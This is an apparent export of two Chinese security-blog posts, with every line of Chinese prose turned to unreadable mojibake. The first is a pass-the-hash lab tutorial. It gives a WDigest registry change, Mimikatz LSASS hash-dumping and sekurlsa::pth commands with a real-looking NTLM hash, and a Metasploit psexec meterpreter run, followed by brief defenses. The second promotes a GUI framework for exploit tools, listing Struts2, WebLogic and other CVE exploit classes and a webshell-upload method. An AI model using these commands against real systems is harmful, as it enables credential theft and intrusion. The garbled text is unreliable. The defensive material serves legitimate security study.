    <title>å“ˆå¸Œä¼ é€’</title>
    <url>/2021/02/14/%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<blockquote>
<p>  ç¬™æ­Œé—´é”™åç­µå¯ã€‚å–œæ–°æ˜¥æ–°å²ã€‚èœä¼ çº¤æ‰‹é’ä¸ç»†ã€‚å’Œæ°”å…¥ã€ä¸œé£é‡Œã€‚</p>
<p>  å¹¡å„¿èƒœå„¿éƒ½å§‘åª‚ã€‚æˆ´å¾—æ›´å¿”æˆã€‚æ„¿æ–°æ˜¥ä»¥åï¼Œå‰å‰åˆ©åˆ©ï¼Œç™¾äº‹éƒ½å¦‚æ„ã€‚ </p>
</blockquote>
<h2 id="0x01-å“ˆå¸Œä¼ é€’æ”»å‡»æ¦‚å¿µ"><a href="#0x01-å“ˆå¸Œä¼ é€’æ”»å‡»æ¦‚å¿µ" class="headerlink" title="0x01 å“ˆå¸Œä¼ é€’æ”»å‡»æ¦‚å¿µ"></a>0x01 å“ˆå¸Œä¼ é€’æ”»å‡»æ¦‚å¿µ</h2><p>åœ¨åŸŸç¯å¢ƒä¸­ï¼Œç”¨æˆ·ç™»å½•è®¡ç®—æœºæ—¶ä½¿ç”¨çš„å¤§éƒ½æ˜¯åŸŸè´¦å·ï¼Œå¤§é‡è®¡ç®—æœºåœ¨å®‰è£…æ—¶ä¼šä½¿ç”¨ç›¸åŒçš„æœ¬åœ°ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ï¼Œå› æ­¤ï¼Œå¦‚æœè®¡ç®—æœºçš„æœ¬åœ°ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ä¹Ÿæ˜¯ç›¸åŒçš„ï¼Œæ”»å‡»è€…å°±èƒ½ä½¿ç”¨å“ˆå¸Œä¼ é€’æ”»å‡»çš„æ–¹æ³•ç™»é™†å†…ç½‘ä¸­çš„å…¶ä»–è®¡ç®—æœºã€‚</p>
<p>åœ¨Windowsç³»ç»Ÿä¸­ï¼Œé€šå¸¸ä¼šä½¿ç”¨NTLMèº«ä»½è®¤è¯ï¼ŒNTLMè®¤è¯ä¸ä½¿ç”¨æ˜æ–‡å£ä»¤ï¼Œè€Œæ˜¯ä½¿ç”¨å£ä»¤åŠ å¯†åçš„hashå€¼ï¼Œhashå€¼ç”±ç³»ç»ŸAPIç”Ÿæˆ(ä¾‹å¦‚LsaLogonUser)ã€‚æ”»å‡»è€…è·å¾—æœ‰æ•ˆçš„ç”¨æˆ·åå’Œç”¨æˆ·å¯†ç å“ˆå¸Œå€¼åï¼Œä»–ä»¬ä¾¿èƒ½å¤Ÿä½¿ç”¨è¯¥ä¿¡æ¯é€šè¿‡LMæˆ–NTLMèº«ä»½éªŒè¯å‘è¿œç¨‹æœåŠ¡å™¨æˆ–æœåŠ¡è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè€Œæ— éœ€è¿›è¡Œ<strong>æš´åŠ›ç ´è§£</strong>æ•£åˆ—ä»¥è·å–æ˜æ–‡å¯†ç ï¼ˆæ­¤æŠ€æœ¯å‘å¸ƒä¹‹å‰éœ€è¦æ­¤å¯†ç ï¼‰ã€‚è¯¥æ”»å‡»åˆ©ç”¨äº†èº«ä»½éªŒè¯åè®®ä¸­çš„ä¸€ç§å®ç°ç¼ºé™·ï¼Œå³æ¯æ¬¡<strong>ä¼šè¯ä¹‹é—´</strong>çš„å¯†ç æ•£åˆ—ä¿æŒé™æ€ï¼Œç›´åˆ°ä¸‹æ¬¡æ›´æ”¹å¯†ç ä¸ºæ­¢ã€‚</p>
<p>ä»Windows Vistaå’ŒWindows Server 2008å¼€å§‹ï¼Œå¾®è½¯é»˜è®¤ç¦ç”¨LM hashã€‚åœ¨Windows Server 2012 R2åŠä¹‹åç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿä¸­ï¼Œé»˜è®¤ä¸ä¼šåœ¨å†…å­˜ä¸­ä¿å­˜æ˜æ–‡å¯†ç ï¼ŒMimikatz å°±è¯»ä¸åˆ°å¯†ç æ˜æ–‡ï¼Œåªèƒ½è¯»å–å“ˆå¸Œå€¼ã€‚è™½ç„¶æ­¤æ—¶å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼æŠ“å–æ˜æ–‡ï¼Œä½†éœ€è¦ç”¨æˆ·é‡æ–°ç™»å½•åæ‰èƒ½æˆåŠŸæŠ“å–ã€‚ä¿®æ”¹æ³¨å†Œè¡¨å‘½ä»¤ä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ï¼Œè¿™ç§æ–¹å¼è¦æ±‚ç³»ç»Ÿé‡å¯æˆ–è€…ç”¨æˆ·é‡æ–°ç™»å½•ï¼Œåœ¨å®æˆ˜ä¸­æ“ä½œèµ·æ¥æˆåŠŸç‡è¿˜æ˜¯æ¯”è¾ƒä½çš„ã€‚å¦‚æœæ”»å‡»è€…æ‹¥æœ‰ç”¨æˆ·å¯†ç çš„å“ˆå¸Œå€¼ï¼Œåˆ™æ— éœ€å¼ºè¡Œä½¿ç”¨æ˜æ–‡å¯†ç ï¼›ä»–ä»¬å¯ä»¥ç®€å•åœ°ä½¿ç”¨ä»–ä»¬å·²ç»æ”¶è·çš„ä»»æ„ç”¨æˆ·å¸æˆ·çš„å“ˆå¸Œå€¼æ¥é’ˆå¯¹è¿œç¨‹ç³»ç»Ÿè¿›è¡Œèº«ä»½éªŒè¯å¹¶æ¨¡æ‹Ÿè¯¥ç”¨æˆ·ã€‚æ¢å¥è¯è¯´ï¼Œä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œå“ˆå¸Œåœ¨åŠŸèƒ½ä¸Šç­‰åŒäºç”Ÿæˆå®ƒä»¬çš„åŸå§‹å¯†ç ã€‚</p>
<p>å› æ­¤ï¼Œæ”»å‡»è€…å¦‚æœä½¿ç”¨å·¥å…·å°†æ•£åˆ—å€¼ä¼ é€’åˆ°å…¶ä»–è®¡ç®—æœºä¸­ï¼Œè¿›è¡Œæƒé™éªŒè¯ï¼Œå°±èƒ½å¤Ÿåœ¨èº«ä»½éªŒè¯çš„æ—¶å€™æ¨¡æ‹Ÿè¯¥ç”¨æˆ·(å³è·³è¿‡è°ƒç”¨APIç”Ÿæˆhashçš„è¿‡ç¨‹)ï¼Œå®ç°å¯¹è®¡ç®—æœºçš„æ§åˆ¶ã€‚</p>
<h2 id="0x02-åˆ©ç”¨æ–¹æ³•"><a href="#0x02-åˆ©ç”¨æ–¹æ³•" class="headerlink" title="0x02 åˆ©ç”¨æ–¹æ³•"></a>0x02 åˆ©ç”¨æ–¹æ³•</h2><h3 id="ç¯å¢ƒæ­é…"><a href="#ç¯å¢ƒæ­é…" class="headerlink" title="ç¯å¢ƒæ­é…"></a>ç¯å¢ƒæ­é…</h3><p>åŸŸæ­å»ºå¯ä»¥å‚è€ƒ<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483820&idx=1&sn=f49f393a5698e366df99ddd0d9269829&chksm=c28298b5f5f511a36cd92fb722ce3b0658a9ee6195f5ad3f89266a4dc2ac3f022fdc8d5b578e#rd">Windowsç»„ç­–ç•¥ææƒå®éªŒ</a></p>
<p>å°†ä¸€å°win7æ·»åŠ åˆ°åŸŸæ§ï¼ˆwin8ï¼‰ä¸­</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160244.png" alt="image-20210214145116625"></p>
<p>ç™»å½•ä¸€ä¸‹åŸŸè´¦æˆ·ï¼Œä¹‹åé€€å‡ºåŸŸè´¦æˆ·ï¼Œç„¶ååˆ‡æ¢ä¸ºæœ¬åœ°è´¦æˆ·</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160250.png" alt="image-20210214145726732"></p>
<p>åˆ‡æ¢æœ¬åœ°è´¦æˆ·</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160257.png" alt="image-20210214145957319"></p>
<h3 id="Mimikatz-äº¤äº’å¼è·å–"><a href="#Mimikatz-äº¤äº’å¼è·å–" class="headerlink" title="Mimikatz äº¤äº’å¼è·å–"></a>Mimikatz äº¤äº’å¼è·å–</h3><p>è¯»å–lsassè¿›ç¨‹çš„ä¿¡æ¯ï¼Œè·å–hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160302.png" alt="image-20210214152209729"></p>
<p>è·å–ç»ˆç«¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:4075bdc2e63781b034a034102356063a</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160306.png" alt="image-20210214152128620"></p>
<p>ä¼šå¼¹å‡ºä¸€ä¸ªäº¤äº’å¼çš„ç»ˆç«¯,è¿™ä¸ªç»ˆç«¯ä»¥åŠä¼ªé€ ä¸ºæˆ‘ä»¬æŒ‡å®šçš„hashå’Œç”¨æˆ·ï¼Œå¯ä»¥ç›´æ¥è®¿é—®smbæœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡copyæ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œè®¡åˆ’ä»»åŠ¡å»æ‹¿åˆ°shellï¼ˆä½¿ç”¨atexecæ”»å‡»ï¼‰ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160310.png" alt="image-20210214152835360"></p>
<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>éœ€è¦ä½¿ç”¨<code>exploit/windows/smb/psexec</code></p>
<p>æ³¨æ„è¿™é‡Œå¡«å…¥çš„å“ˆå¸Œæ˜¯<code>LM Hash:NTLM Hash</code>, å½“ç³»ç»Ÿé»˜è®¤ä¸æ”¯æŒLM hashï¼ŒLM hashå¯ä»¥è®¾å®šä¸ºä»»æ„å€¼ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 172.16.27.10</span><br><span class="line">set smbuser administrator</span><br><span class="line">set SMBPass 00000000000000000000000000000000:4075bdc2e63781b034a034102356063a</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160316.png" alt="image-20210214154108503"></p>
<p>å½“ç„¶è¿˜æœ‰ä¸€äº›å…¶å®ƒåˆ©ç”¨æ–¹æ³•ï¼Œæ¯”å¦‚ï¼šCobalt Strike æŠ“å–ã€powershellè¯»å–ã€ SAMè¡¨ç¦»çº¿è·å–hashã€wmiexecåˆ©ç”¨hashè·å–shellç­‰ç­‰</p>
<h2 id="0x03-é˜²èŒƒæªæ–½"><a href="#0x03-é˜²èŒƒæªæ–½" class="headerlink" title="0x03 é˜²èŒƒæªæ–½"></a>0x03 é˜²èŒƒæªæ–½</h2><h3 id="KB2871997è¡¥ä¸çš„å½±å“"><a href="#KB2871997è¡¥ä¸çš„å½±å“" class="headerlink" title="KB2871997è¡¥ä¸çš„å½±å“"></a>KB2871997è¡¥ä¸çš„å½±å“</h3><p>é˜²èŒƒé¦–å…ˆæƒ³åˆ°æ‰“è¡¥ä¸ï¼Œå¾®è½¯ä¹Ÿæ—©åœ¨2014å¹´5æœˆå‘å¸ƒäº†KB2871997è¡¥ä¸ï¼Œè¯¥è¡¥ä¸ç¦æ­¢é€šè¿‡æœ¬åœ°ç®¡ç†å‘˜æƒé™ä¸è¿œç¨‹è®¡ç®—æœºè¿›è¡Œè¿æ¥ï¼Œå…¶åæœå°±æ˜¯ï¼šæ— æ³•é€šè¿‡æœ¬åœ°ç®¡ç†å‘˜æƒé™å¯¹è¿œç¨‹è®¡ç®—æœºä½¿ç”¨Psexecã€WMIã€smbececç­‰ï¼Œä¹Ÿæ— æ³•è®¿é—®è¿œç¨‹çš„æ–‡ä»¶å…±äº«ç­‰ã€‚</p>
<p>ä½†å®é™…ä¸Šå°±ç®—æ‰“äº†KB2871997è¡¥ä¸åï¼ŒAdministratorè´¦å·(SIDä¸º500)ä¹Ÿæ˜¯ä¾‹å¤–çš„ï¼Œä½¿ç”¨è¯¥è´¦æˆ·çš„NTLM Hashä¾ç„¶å¯ä»¥è¿›è¡Œå“ˆå¸Œä¼ é€’ã€‚</p>
<blockquote>
<p>  KB2871997è¡¥ä¸å¹¶ä¸èƒ½çœŸæ­£é˜²æ­¢å“ˆå¸Œä¼ é€’ï¼Œåªæ˜¯åœ¨ä¸€å®šç¨‹åº¦ä¸Šç¼“è§£äº†PTHçš„é—®é¢˜ã€‚</p>
<p>  æµ…æ¢å†…ç½‘æ¨ªå‘ç§»åŠ¨-Pass The Hash  <a href="https://xz.aliyun.com/t/8117#toc-11">https://xz.aliyun.com/t/8117#toc-11</a></p>
<p>  KB22871997æ˜¯å¦çœŸçš„èƒ½é˜²å¾¡PTHæ”»å‡»ï¼Ÿ<a href="https://www.anquanke.com/post/id/193150">https://www.anquanke.com/post/id/193150</a></p>
</blockquote>
<h3 id="é˜²å¾¡-mimikatz-æ”»å‡»"><a href="#é˜²å¾¡-mimikatz-æ”»å‡»" class="headerlink" title="é˜²å¾¡ mimikatz æ”»å‡»"></a>é˜²å¾¡ mimikatz æ”»å‡»</h3><p>mimikatzåœ¨æŠ“å–æ•£åˆ—å€¼æˆ–æ˜æ–‡å¯†ç æ—¶ï¼Œéœ€è¦ç”¨åˆ°Debugæƒé™ï¼ˆå› ä¸ºmimikatzéœ€è¦å’Œlsassè¿›ç¨‹è¿›è¡Œäº¤äº’ï¼Œå¦‚æœæ²¡æœ‰Debugæƒé™ï¼Œmimikatzå°†ä¸èƒ½è¯»å–lsassè¿›ç¨‹é‡Œçš„å¯†ç ï¼‰ã€‚è€ŒDebugæƒé™å½’æœ¬åœ°ç®¡ç†å‘˜Administratoræ‰€æœ‰,ç›®çš„æ˜¯ç¡®å®šå“ªäº›ç”¨æˆ·å¯ä»¥å°†è°ƒè¯•å™¨é™„åŠ åˆ°ä»»ä½•è¿›ç¨‹æˆ–å†…æ ¸ä¸­ï¼Œä½†ä¸€èˆ¬Administratorä¸ä¼šç”¨åˆ°è¿™ä¸ªæƒé™(é™¤éæ˜¯ç³»ç»Ÿè¿›ç¨‹)ã€‚<br><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160322.png" alt="image-20210214155950651"></p>
<p>æ‰€ä»¥åœ¨é…ç½®ç”¨æˆ·æƒé™æ—¶ï¼Œå¯ä»¥å°†æ‹¥æœ‰Debugæƒé™çš„æœ¬åœ°ç®¡ç†å‘˜ä»Administratorç»„ä¸­ç§»é™¤ã€‚é‡å¯ç³»ç»Ÿä¹‹åï¼Œåœ¨è¿è¡Œmimikatzï¼Œåœ¨ç¬¬ä¸€æ­¥â€privilege::debugâ€æ—¶å°±ä¼šæŠ¥é”™äº†ã€‚</p>
]]></content>
      <categories>
        <category>åŸŸæ¸—é€</category>
      </categories>
      <tags>
        <tag>Windowsææƒ</tag>
        <tag>åŸŸæ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>å›¾å½¢åŒ–æ¼æ´åˆ©ç”¨Demo-JavaFXç‰ˆ</title>
    <url>/2021/03/23/%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Demo-JavaFX%E7%89%88/</url>
    <content><![CDATA[<h2 id="0x01-è¿™æ˜¯ä¸ªå˜›ï¼Ÿ"><a href="#0x01-è¿™æ˜¯ä¸ªå˜›ï¼Ÿ" class="headerlink" title="0x01 è¿™æ˜¯ä¸ªå˜›ï¼Ÿ"></a>0x01 è¿™æ˜¯ä¸ªå˜›ï¼Ÿ</h2><p>è¿™æ˜¯ä¸€ä¸ªæ„å»ºå›¾å½¢åŒ–æ¼æ´åˆ©ç”¨çš„ä¸€ä¸ªé¡¹ç›®ï¼Œå·²ç»å†™å¥½æ¶å­ï¼Œåªéœ€è¦å¾€é‡Œå¡«å……expå³å¯ï¼Œå¸®åŠ©å®‰å…¨äººå‘˜å¿«é€Ÿæ„å»ºä¸€ä¸ªå›¾å½¢åŒ–çš„ã€è·¨å¹³å°çš„æ¼æ´åˆ©ç”¨å·¥å…·ã€‚</p>
<p>è™½ç„¶æœ‰å¾ˆå¤šä¼˜ç§€çš„å‘½ä»¤è¡Œåˆ©ç”¨å·¥å…·ï¼Œä½†æˆ‘è§‰å¾—è¿˜æ˜¯å¸¦ç•Œé¢çš„æ–¹ä¾¿ã€ç›´è§‚ã€‚</p>
<p>ä½¿ç”¨æœ¬é¡¹ç›®ï¼Œä½ ä¸éœ€è¦æ‡‚å¤ªå¤šJavaè¯­è¨€ï¼Œåªéœ€è¦äº†è§£åŸºæœ¬çš„è¯­æ³•ï¼Œå‚è€ƒè‡ªå¸¦çš„EXPä¾‹å­ï¼Œå³å¯å¿«é€Ÿå¼€å‘ä¸€æ¬¾<strong>å±äºä½ è‡ªå·±</strong>çš„æ¼æ´åˆ©ç”¨å·¥å…·ï¼Œå»ºç«‹è‡ªå·±çš„æ¼æ´åˆ©ç”¨åº“ã€‚</p>
<p><a href="https://mp.weixin.qq.com/s/j5BHSbNZ76XbSZp6hFj9fw">ExpDemo-JavaFXå·¥å…·æ–°å¢æ¼æ´ç¼–å†™æ•™ç¨‹</a></p>
<h2 id="0x02-Demo"><a href="#0x02-Demo" class="headerlink" title="0x02 Demo"></a>0x02 Demo</h2><p>ç»è¿‡å¤šæ¬¡æ”¹ç‰ˆï¼Œè¿™æ˜¯æœ€ç»ˆ(?)çš„æ•ˆæœã€‚è¯¦ç»†è§<a href="https://github.com/yhy0/ExpDemo-JavaFX/blob/master/%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95.md">æ›´æ–°è®°å½•.md</a></p>
<p><a href="https://user-images.githubusercontent.com/31311038/129846212-c0a50a7d-0890-4fdf-909e-000981246e3b.mp4">https://user-images.githubusercontent.com/31311038/129846212-c0a50a7d-0890-4fdf-909e-000981246e3b.mp4</a></p>
<video controls="controls" loop="loop" autoplay="autoplay" width="100%"> 
    <source src="/img/SJ.mp4" type="video/mp4">
</video>

<h2 id="0x03-ç¼–å†™å±äºä½ çš„å›¾åƒåŒ–æ¼æ´åˆ©ç”¨å·¥å…·"><a href="#0x03-ç¼–å†™å±äºä½ çš„å›¾åƒåŒ–æ¼æ´åˆ©ç”¨å·¥å…·" class="headerlink" title="0x03 ç¼–å†™å±äºä½ çš„å›¾åƒåŒ–æ¼æ´åˆ©ç”¨å·¥å…·"></a>0x03 ç¼–å†™å±äºä½ çš„å›¾åƒåŒ–æ¼æ´åˆ©ç”¨å·¥å…·</h2><h4 id="3-1-é¡¹ç›®ç»“æ„"><a href="#3-1-é¡¹ç›®ç»“æ„" class="headerlink" title="3.1 é¡¹ç›®ç»“æ„"></a>3.1 é¡¹ç›®ç»“æ„</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ ExpDemo-JavaFX.iml</span><br><span class="line">â”œâ”€â”€ logs          è¿è¡Œæ—¥å¿—æ–‡ä»¶</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ debug.log</span><br><span class="line">â”‚Â Â  â””â”€â”€ error.log</span><br><span class="line">â”œâ”€â”€ pom.xml</span><br><span class="line">â””â”€â”€ src</span><br><span class="line">    â””â”€â”€ main</span><br><span class="line">        â”œâ”€â”€ java</span><br><span class="line">        â”‚Â Â  â””â”€â”€ fun</span><br><span class="line">        â”‚Â Â      â””â”€â”€ fireline</span><br><span class="line">        â”‚Â Â          â”œâ”€â”€ AppStartUp.java    åº”ç”¨ç¨‹åºå¯åŠ¨å…¥å£</span><br><span class="line">        â”‚Â Â          â”œâ”€â”€ controller    æ§åˆ¶JavaFXå›¾å½¢åŒ–ç•Œé¢çš„å„ç§æ˜¾ç¤ºã€äº‹ä»¶ç­‰ï¼Œæ ¸å¿ƒä»£ç  </span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”œâ”€â”€ MainController.java  ä¸»ç•Œé¢çš„controllerï¼Œè´Ÿè´£åˆ‡æ¢ç•Œé¢å’ŒåŸºæœ¬ä¿¡æ¯æ˜¾ç¤º</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”œâ”€â”€ OAController.java   OAæ¼æ´åˆ©ç”¨åˆ‡æ¢ç•Œé¢çš„ç›¸å…³é€»è¾‘</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”œâ”€â”€ OthersController.java  å…¶ä»–æ¼æ´ç•Œé¢çš„ç›¸å…³é€»è¾‘</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”œâ”€â”€ Struts2Controller.java  Struts2æ¼æ´åˆ©ç”¨ç•Œé¢çš„ç›¸å…³é€»è¾‘</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â””â”€â”€ oa      OAæ¼æ´åˆ©ç”¨çš„ç›¸å…³é€»è¾‘</span><br><span class="line">        â”‚Â Â          â”‚Â Â      â””â”€â”€ OASeeyonController.java</span><br><span class="line">        â”‚Â Â          â”œâ”€â”€ core     æ ¸å¿ƒä»£ç æ–‡ä»¶å¤¹</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”œâ”€â”€ Constants.java   ä¸€äº›å¸¸é‡åŸºæœ¬ä¿¡æ¯</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”œâ”€â”€ ExploitInterface.java   exp ç¼–å†™è¦å®ç°çš„æ¥å£</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”œâ”€â”€ Job.java    ä¸€ç§æ¼æ´å…¨éƒ¨æ£€æŸ¥çš„ç±»</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â””â”€â”€ VulInfo.java</span><br><span class="line">        â”‚Â Â          â”œâ”€â”€ exp			å„ç§ exp å®ç°ç±»</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”œâ”€â”€ apache</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”‚Â Â  â””â”€â”€ struts2</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”‚Â Â      â”œâ”€â”€ S2_005.java</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”‚Â Â      â”œâ”€â”€ S2_009.java</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”‚Â Â      â”œâ”€â”€ S2_016.java</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”‚Â Â      â”œâ”€â”€ S2_019.java</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”‚Â Â      â”œâ”€â”€ S2_032.java</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”‚Â Â      â”œâ”€â”€ S2_045.java</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”‚Â Â      â”œâ”€â”€ S2_046.java</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”‚Â Â      â””â”€â”€ S2_DevMode.java</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”œâ”€â”€ cms</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”‚Â Â  â””â”€â”€ nc</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”‚Â Â      â””â”€â”€ CNVD_2021_30167.java</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”œâ”€â”€ oracle</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â”‚Â Â  â””â”€â”€ CVE_2020_14882.java</span><br><span class="line">        â”‚Â Â          â”‚Â Â  â””â”€â”€ others</span><br><span class="line">        â”‚Â Â          â”‚Â Â      â””â”€â”€ CVE_2021_22986.java</span><br><span class="line">        â”‚Â Â          â””â”€â”€ tools  å·¥å…·æ–‡ä»¶å¤¹</span><br><span class="line">        â”‚Â Â              â”œâ”€â”€ HttpTool.java  HTTP è¯·æ±‚å°è£…</span><br><span class="line">        â”‚Â Â              â”œâ”€â”€ MyCERT.java    HTTPS è¯·æ±‚è¯ä¹¦è®¾ç½®</span><br><span class="line">        â”‚Â Â              â””â”€â”€ Tools.java     ä¸€äº›å¤„ç†å‡½æ•°</span><br><span class="line">        â””â”€â”€ resources    èµ„æºæ–‡ä»¶å¤¹</span><br><span class="line">            â”œâ”€â”€ css      ç•Œé¢cssæ ·å¼è¡¨</span><br><span class="line">            â”‚Â Â  â””â”€â”€ main.css</span><br><span class="line">            â”œâ”€â”€ fxml    ç•Œé¢çš„è®¾è®¡æ–‡ä»¶</span><br><span class="line">            â”‚Â Â  â”œâ”€â”€ Main.fxml</span><br><span class="line">            â”‚Â Â  â”œâ”€â”€ OA.fxml</span><br><span class="line">            â”‚Â Â  â”œâ”€â”€ Others.fxml</span><br><span class="line">            â”‚Â Â  â”œâ”€â”€ Struts2.fxml</span><br><span class="line">            â”‚Â Â  â”œâ”€â”€ Weblogic.fxml</span><br><span class="line">            â”‚Â Â  â””â”€â”€ oa</span><br><span class="line">            â”‚Â Â      â”œâ”€â”€ OA-E-office.fxml</span><br><span class="line">            â”‚Â Â      â”œâ”€â”€ OA-Kingdee.fxml</span><br><span class="line">            â”‚Â Â      â”œâ”€â”€ OA-Landray.fxml</span><br><span class="line">            â”‚Â Â      â””â”€â”€ OA-Seeyon.fxml</span><br><span class="line">            â”œâ”€â”€ img</span><br><span class="line">            â”‚Â Â  â”œâ”€â”€ sec.png</span><br><span class="line">            â”‚Â Â  â””â”€â”€ weixin.jpg</span><br><span class="line">            â””â”€â”€ log4j.properties   æ—¥å¿—ç›¸å…³è®¾ç½®</span><br></pre></td></tr></table></figure>

<h4 id="3-2-ç¼–å†™EXP"><a href="#3-2-ç¼–å†™EXP" class="headerlink" title="3.2 ç¼–å†™EXP"></a>3.2 ç¼–å†™EXP</h4><p>ç¼–å†™EXPæ—¶ï¼Œè¦ä½¿ç”¨ <code>implements</code>å®ç°<code>ExploitInterface</code>æ¥å£ï¼Œå®ç°æ¥å£ä¸­çš„å‡ ä¸ªæ–¹æ³•</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133114.png" alt="image-20210327190517731"></p>
<ul>
<li>checkVUL		ä½¿ç”¨poc æ£€æŸ¥æ˜¯å¦æ¼æ´</li>
<li>exeCMD          ä½¿ç”¨expæ‰§è¡Œå‘½ä»¤</li>
<li>uploadFile        ä½¿ç”¨å‘½ä»¤æ‰§è¡Œ å†™webshellï¼Œä¸Šä¼ æ–‡ä»¶</li>
<li>getWebPath     è·å–ç½‘ç«™çš„webç›®å½•ï¼Œä¾›ä¸Šä¼ æ–‡ä»¶ä½¿ç”¨</li>
<li>isVul                æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œæ£€æŸ¥æ—¶ä¼šæ ¹æ®ç»“æ„è‡ªåŠ¨èµ‹å€¼ï¼Œä¾›åç»­è°ƒç”¨</li>
</ul>
<p>EXPå…·ä½“ç¼–å†™è¯·å‚è€ƒ <code>fun/fireline/exp</code> ä¸‹çš„å„ç§æ¼æ´å®ç°</p>
<p>å½“ç¼–å†™å®ŒEXPåï¼Œè½¬åˆ° <code>fun/fireline/controller</code> ä¸‹å¯¹åº”çš„<strong>xxController.java</strong>æ–‡ä»¶ï¼Œæ¯”å¦‚æ–°ç¼–å†™äº†Struts2çš„ç›¸å…³æ¼æ´ï¼Œä¿®æ”¹<strong>Struts2Controller.java</strong>çš„<strong>STRUTS2</strong>å˜é‡ï¼Œæ–°åŠ å…¥ä¸€ä¸ªæ¼æ´åç§°ï¼Œè¿™é‡Œå¯¹åº”çš„æ˜¯å›¾åƒåŒ–ç•Œé¢ä¸­å¯ä¾›é€‰æ‹©çš„æ¼æ´åˆ—è¡¨</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133131.png" alt="image-20210818125816864"></p>
<p>ä¹‹åè¿›å…¥å’Œ <code>fun/fireline/tools/Tools.java</code> çš„<strong>getExploit</strong>æ–¹æ³•ä¸­æ–°å¢ä¸€ä¸ª<strong>else if</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133137.png" alt="image-20210818130128550"></p>
<p>ç¼–å†™å®Œåï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œ<code>fun/fireline/AppStartUp.java</code>ç±», æŸ¥çœ‹æ˜¯å¦æ­£å¸¸è¿è¡Œã€‚</p>
<p>å¼€å‘è¿‡ç¨‹ä¸­æ¯æ¬¡ä¿®æ”¹å®Œè¿è¡Œå‰ï¼Œæœ€å¥½å°†ç”Ÿæˆçš„<strong>target</strong>ç›®å½•åˆ é™¤å†è¿è¡Œ</p>
<h4 id="3-3-æ–°å¢æ¼æ´é¡µé¢"><a href="#3-3-æ–°å¢æ¼æ´é¡µé¢" class="headerlink" title="3.3 æ–°å¢æ¼æ´é¡µé¢"></a>3.3 æ–°å¢æ¼æ´é¡µé¢</h4><p>å…·ä½“è¯·çœ‹<a href="https://github.com/yhy0/ExpDemo-JavaFX/blob/master/%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95.md">æ›´æ–°è®°å½•.md</a></p>
